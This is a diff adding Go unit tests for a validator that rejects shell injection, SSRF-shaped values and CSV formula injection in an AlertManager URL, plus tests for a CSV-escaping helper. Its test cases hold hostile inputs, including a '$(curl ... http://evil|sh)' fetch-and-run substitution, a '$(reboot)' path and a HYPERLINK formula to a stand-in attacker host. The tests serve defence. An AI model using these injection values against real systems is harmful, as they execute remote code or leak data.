@@ -47,6 +47,69 @@ func TestValidateWebhookHost(t *testing.T) {
 	}
 }
 
+// TestValidateAlertManagerURL is the CL-03/CL-21 guard: the AM URL renders into
+// a copy-paste `curl` shell fence and a CSV a sysadmin opens, so the validator
+// must reject shell/CSV injection and SSRF-shaped values while accepting the
+// legitimate host[:port][/path] forms.
+func TestValidateAlertManagerURL(t *testing.T) {
+	cases := []struct {
+		name    string
+		input   string
+		wantErr bool
+	}{
+		{"empty is valid (URL is optional)", "", false},
+		{"plain host:port", "http://alertmanager:9093", false},
+		{"https host", "https://am.example.com", false},
+		{"reverse-proxy path prefix", "https://obs.example.com/alertmanager", false},
+		{"IPv6 literal", "http://[::1]:9093", false},
+		{"trailing slash only", "http://am:9093/", false},
+		{"ftp scheme rejected", "ftp://am:9093", true},
+		{"embedded credentials rejected", "http://user:pass@am:9093", true},
+		{"query string rejected", "http://am:9093?x=y", true},
+		{"fragment rejected", "http://am:9093#frag", true},
+		{"non-numeric port rejected", "http://am:xyz", true},
+		// The headline injection: survives strings.Fields via ${IFS}, would land
+		// unquoted in `curl -X POST <url>/-/reload`.
+		{"shell command substitution rejected", "http://am:9093$(curl${IFS}-s${IFS}http://evil|sh)", true},
+		{"backtick in host rejected", "http://am`whoami`:9093", true},
+		{"shell-danger path rejected", "http://am:9093/$(reboot)", true},
+	}
+	for _, tc := range cases {
+		t.Run(tc.name, func(t *testing.T) {
+			err := validateAlertManagerURL(tc.input)
+			if tc.wantErr && err == nil {
+				t.Fatalf("expected error for %q, got nil", tc.input)
+			}
+			if !tc.wantErr && err != nil {
+				t.Fatalf("expected no error for %q, got %v", tc.input, err)
+			}
+		})
+	}
+}
+
+// TestCSVSafe pins the CL-21 formula-injection neutralization: formula-leading
+// cells get a quote prefix, benign cells are untouched.
+func TestCSVSafe(t *testing.T) {
+	cases := []struct {
+		in   string
+		want string
+	}{
+		{"", ""},
+		{"http://am:9093", "http://am:9093"},
+		{"high-cpu-usage--team-chan", "high-cpu-usage--team-chan"},
+		{`=HYPERLINK("http://evil/x","OK")`, `'=HYPERLINK("http://evil/x","OK")`},
+		{"+WEBSERVICE(A1)", "'+WEBSERVICE(A1)"},
+		{"-2+3", "'-2+3"},
+		{"@SUM(A1)", "'@SUM(A1)"},
+		{"\ttabbed", "'\ttabbed"},
+	}
+	for _, tc := range cases {
+		if got := csvSafe(tc.in); got != tc.want {
+			t.Errorf("csvSafe(%q) = %q, want %q", tc.in, got, tc.want)
+		}
+	}
+}
+
 // TestResolveWebhookHost pins the precedence between the WebhookHost free-text
 // field and the WebhookHostPreset dropdown. The custom-wins rule is what keeps
 // existing installs (which only ever had the text field) behaving identically
